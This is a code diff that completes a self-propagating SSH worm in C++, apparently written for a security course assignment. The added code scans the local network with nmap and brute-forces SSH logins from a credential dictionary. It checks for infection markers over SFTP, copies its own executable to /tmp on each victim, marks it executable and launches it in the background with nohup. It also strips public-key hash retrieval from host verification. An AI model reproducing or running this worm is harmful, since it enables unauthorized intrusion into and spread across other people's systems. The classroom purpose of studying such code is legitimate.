@@ -20,6 +20,9 @@
 #include <vector>
 #include <libssh/libssh.h>  // ssh library
 #include <libssh/sftp.h>  // sftp module
+#include <fcntl.h>
+#include <libgen.h>
+#include <limits.h>
 
 /*******************************************************************************
  * Define sections
@@ -53,8 +56,40 @@ bool isFileExist(const string inFile) {
  * @param sshClient an active ssh session to a remote system
  * @return a boolean of true if exist or false if not
  ******************************************************************************/
-bool isRemoteFileExist(ssh_session sshClient, const string inFile) {
-    // TODO
+bool isRemoteFileExist(ssh_session &sshClient, const string inFile) {
+
+    // The return code
+    int rc;
+
+    // The fileAttributes
+    sftp_attributes fileStat;
+
+    // Create a sftp session
+    sftp_session sftp = sftp_new(sshClient);
+    if (sftp == NULL) {
+        perror("isRemoteFileExist: Unable to create sftp session\n");
+        return false;
+    }
+
+    // Initialize the sftp session
+    rc = sftp_init(sftp);
+    if (rc != SSH_OK) {
+        // Free the memory for the sftp structure
+        sftp_free(sftp);
+        perror("isRemoteFileExist: Unable to initialize sftp session\n");
+        return false;
+    }
+
+    // Try to stat the file
+    fileStat = sftp_stat(sftp, inFile.c_str());
+    if (fileStat == NULL) {
+        fprintf(stderr, "isRemoteFileExist: Stat error <%s>\n", sftp_get_error(sftp));
+        sftp_free(sftp);
+        return false;
+    }
+
+    // Release the sftp session
+    sftp_free(sftp);
     return true;
 }
 
@@ -72,7 +107,7 @@ bool isLocalSystemInfected() {
  * @param sshClient
  * @return a boolean of true if remote system infected or false if not
  ******************************************************************************/
-bool isRemoteSystemInfected(ssh_session sshClient) {
+bool isRemoteSystemInfected(ssh_session &sshClient) {
     return (isRemoteFileExist(sshClient, SELF_MARKER_FILE) ||
             isRemoteFileExist(sshClient, INFECTED_MARKER_FILE));
 }
@@ -215,7 +250,7 @@ Iface getMyActiveIP() {
 /*******************************************************************************
  * Function: getHostsOnTheSameNetwork
  * @param host A Iface struct contains information about the system
- 8              such as ip, mask, cidr
+ *              such as ip, mask, cidr
  * @return a list of IP addresses of hosts that have SSH port open
  ******************************************************************************/
 vector<string> getHostsOnTheSameNetwork(const Iface host) {
@@ -253,6 +288,7 @@ vector<string> getHostsOnTheSameNetwork(const Iface host) {
         // Child return, we should have access to the file to process it
         vector<string> allHosts;
 
+        // Check to make sure that nmap generate a file
         if (isFileExist(nmapFile)) {
 
             // We need to parse the nmapFile
@@ -282,11 +318,21 @@ vector<string> getHostsOnTheSameNetwork(const Iface host) {
                     }
                 }
             }
-            return allHosts;
+
+            // Close the file
+            fclose(fp);
+
+            // Remove the temp nmap file
+            if (remove(nmapFile.c_str()) == -1) {
+                fprintf(stderr, "WARNING: unable to remove %s\n", nmapFile.c_str());
+            }
+
         } else {
             perror ("getHostsOnTheSameNetwork: nmap did not generated file!!!\n");
-            exit(-1);
         }
+
+        // Return allHosts
+        return allHosts;
     }
 }
 
@@ -299,15 +345,8 @@ vector<string> getHostsOnTheSameNetwork(const Iface host) {
 int sshVerifyKnownHost(ssh_session sshClient) {
     // Successfully connect to server.  Accept connection
     // and write the knownhost file
-    unsigned char *keyHash = NULL;
     bool goodHost = false;
     int state;
-
-    // Get public key hash from the server
-    if ( ssh_get_pubkey_hash(sshClient, &keyHash) < 0 ) {
-        perror("Unable to get pubkey hash\n");
-        return -1;
-    }
 
     // Check known host
     state = ssh_is_server_known(sshClient);
@@ -342,7 +381,6 @@ int sshVerifyKnownHost(ssh_session sshClient) {
     } // End switch state
 
     // Clear the hash value
-    ssh_clean_pubkey_hash(&keyHash);
     if (goodHost) {
         return 0;
     } else {
@@ -446,11 +484,16 @@ ssh_session attackSystem(const string host) {
 
     printf("Attacking host: %s ...\n", host.c_str());
     for (int i = 0; i < DICTIONARY_SIZE; i++) {
+        // Retrieve the credential from dictionary
         Credential cred = DICTIONARY[i];
+
+        // Try the credential against the host.  If successful, sshClient
+        // will be set to a connected session
         if (tryCredential(sshClient, host, cred) == 0) {
             return sshClient;
         }
     }
+
     return NULL;
 }
 
@@ -470,7 +513,7 @@ int show_remote_files(ssh_session session) {
     ssh_channel_free(channel);
     return rc;
   }
-  rc = ssh_channel_request_exec(channel, "ls -l");
+  rc = ssh_channel_request_exec(channel, "ls -l abc");
   if (rc != SSH_OK)
   {
     ssh_channel_close(channel);
@@ -502,6 +545,182 @@ int show_remote_files(ssh_session session) {
   ssh_channel_free(channel);
   return SSH_OK;
 }
+
+/*******************************************************************************
+ * Function: spreadFile
+ * @param sshClient an active ssh session
+ * @param source is a string contain the path to the source file
+ * @param target is a string contain the path of the target file
+ * @return 0 if success or -1 if fail
+ ******************************************************************************/
+int spreadFile(ssh_session &sshClient, char *source, char *target) {
+
+    // The return code
+    int rc;
+
+    // The structure for the remote file
+    sftp_file remoteFile;
+
+    // We want to Open the file to Write Only, and Truncate if already exist
+    int access_type = O_WRONLY | O_CREAT | O_TRUNC;
+
+    // Create a sftp session
+    sftp_session sftp = sftp_new(sshClient);
+
+    if (sftp == NULL) {
+        perror("spreadFile: Unable to create sftp session\n");
+        return -1;
+    }
+
+    // Initialize the sftp session
+    rc = sftp_init(sftp);
+    if (rc != SSH_OK) {
+        // Free the memory for the sftp structure
+        sftp_free(sftp);
+        perror("spreadFile: Unable to initialize sftp session\n");
+        return -1;
+    }
+
+    // Open the worm file for reading
+    FILE* localFile = fopen(source, "r");
+    if (!localFile) {
+        perror("spreadFile: Unable to open source file with fopen\n");
+        return -1;
+    }
+
+    // Open the remote file for writing
+    remoteFile = sftp_open(sftp, target, access_type, S_IRWXU);
+    if (remoteFile == NULL) {
+        perror("spreadFile: Unable to open remote file for writing\n");
+        return -1;
+    }
+
+    // Write the data from source to target
+    char buffer[1024];
+    int readByte, writeByte;
+    while (!feof(localFile)) {
+        if ( (readByte = fread(buffer, sizeof(char), 1024, localFile)) < 0 ) {
+            perror("spreadFile: Error reading local file\n");
+            return -1;
+        }
+        writeByte = sftp_write(remoteFile, buffer, readByte);
+        if (writeByte != readByte) {
+            perror("spreadFile: Error writing to remote file\n");
+            return -1;
+        }
+    }
+
+    // Once we get here we finished writing the file, close it
+    fclose(localFile);
+
+    // Close remote file
+    rc = sftp_close(remoteFile);
+    if (rc != SSH_OK)
+    {
+        perror("spreadFile: Unable to close remote file\n");
+        return -1;
+    }
+
+    // Release the sftp session
+    sftp_free(sftp);
+    return 0;
+}
+
+/*******************************************************************************
+ * Function: remoteExecute
+ * @param sshClient an active ssh session
+ * @param cmd is a string contain the command to execute remotely
+ * @return 0 if success or -1 if fail
+ ******************************************************************************/
+int remoteExecute(ssh_session &sshClient, char *cmd) {
+
+    // Setup a channel
+    ssh_channel ssh;
+    int rc;
+
+    // Create a channel
+    ssh = ssh_channel_new(sshClient);
+    if (ssh == NULL) {
+        perror("remoteExecute: Unable to create channel\n");
+        return -1;
+    }
+
+    // Open the channel
+    rc = ssh_channel_open_session(ssh);
+    if (rc != SSH_OK) {
+        perror("remoteExecute: Unable to open the channel\n");
+        ssh_channel_free(ssh);
+        return -1;
+    }
+
+    // Execute the command
+    rc = ssh_channel_request_exec(ssh, cmd);
+    if (rc != SSH_OK) {
+        perror("remoteExecute: Unable to execute command\n");
+        ssh_channel_close(ssh);
+        ssh_channel_free(ssh);
+        return -1;
+    }
+
+    // if we get here it means the command execute successfully
+    return 0;
+
+}
+
+/*******************************************************************************
+ * Function: spreadAndExecute
+ * @param sshClient an active ssh session
+ * @param fromHost a string contains the IP of the attacker
+ *                 this is mainly for identify purpose for the assignment
+ * @return 0 if success or -1 if fail
+ ******************************************************************************/
+int spreadAndExecute(ssh_session &sshClient, const string fromHost) {
+    // Determine the worm location and its base name
+    char sourceName[PATH_MAX];
+    char destName[PATH_MAX];
+    char command[1024];
+
+    // Determine the full path of the worm file
+    if (readlink("/proc/self/exe", sourceName, PATH_MAX) == -1) {
+        perror("spreadAndExecute: problem with readlink\n");
+        return -1;
+    }
+
+    // Build out the worm destination path and name
+    sprintf(destName, "%s%s", "/tmp/", basename(sourceName));
+
+    // Spread the file
+    if (spreadFile(sshClient, sourceName, destName) != 0) {
+        perror("spreadAndExecute: not able to spread worm\n");
+        return -1;
+    }
+
+    // We want to chmod +x on it
+    sprintf(command, "%s%s", "chmod +x ", destName);
+    if (remoteExecute(sshClient, command) != 0) {
+        perror("spreadAndExecute: failed chmod the worm\n");
+        return -1;
+    }
+
+    // Now we tell it to execute
+    sprintf(command, "%s %s %s %s", "nohup", destName, fromHost.c_str(), " >/tmp/nohup.out 2>&1 &");
+    if (remoteExecute(sshClient, command) != 0) {
+        perror("spreadAndExecute: failed execute the worm\n");
+        return -1;
+    }
+
+    return 0;
+}
+
+/*******************************************************************************
+ * Function: performMalicious
+ * @param N/A
+ * @return 0 if success or -1 if fail
+ ******************************************************************************/
+int performMalicious() {
+    return 0;
+}
+
 /*******************************************************************************
  * Main program
  * Program accept command line arguments
@@ -528,6 +747,10 @@ int main (int argc, const char **argv) {
             exit(0);
         } else {
             string fromHost = argv[1];
+
+            // Perform malicious
+            performMalicious();
+
             // Mark the system
             markSystemAsInfected(fromHost);
         }
@@ -539,15 +762,17 @@ int main (int argc, const char **argv) {
     // Get all the hosts from the network
     allHosts = getHostsOnTheSameNetwork(thisHost);
 
+    // Print out the current host network info
     printf("Host IP: %s Mask: %s CIDR: %s\n", thisHost.ip.c_str(),
                       thisHost.mask.c_str(), thisHost.cidr.c_str());
+
+    // Print out the list of all the the hosts found from scanning
     printf("Found the following hosts:\n");
     for (int i = 0; i < allHosts.size(); i++) {
         printf("Host: %s\n", allHosts[i].c_str());
     }
 
     // Loop through to attack the system
-
     for (int i = 0; i < allHosts.size(); i++) {
         string host = allHosts[i];
         ssh_session sshClient;
@@ -559,21 +784,34 @@ int main (int argc, const char **argv) {
             continue;
         }
 
+        //int rc = show_remote_files(sshClient);
+
         // If we get here, it means that we have a good sshClient
-        // TODO
 
-        // TODO: Get something done here with the session
-        int rc = show_remote_files(sshClient);
+        if (! isRemoteSystemInfected(sshClient)) {
 
-        ssh_disconnect(sshClient);
-        ssh_free(sshClient);
-        // If the remote system is already infected skip
-        //    continue;
-        // Else we spread it
-        // spreadAndExecute(sshSession, thisHost.ip);
-        //    spread Done
-        //    break;  // Since we only do 1 hop spread at a time
-    }
+            // The remote system has not been infected yet.
+            // We will spread it
+            if (spreadAndExecute(sshClient, thisHost.ip) != 0) {
+                perror("Failed to spread and execute\n");
+            } else {
+                printf("Successfully spread and execute\n");
+            };
+
+            // Close the sshClient
+            ssh_disconnect(sshClient);
+            ssh_free(sshClient);
+
+            // Since we want to spread from A to B.  Then B to C
+            break;
+
+        } else {
+            // The remote system has been infected.  Skip to next one
+            printf("Remote host %s already infected.  Skip to the next one\n", host.c_str());
+            continue;
+        }
+
+    }  // End for loop of all Hosts
 
     // All Done here
     return 0;
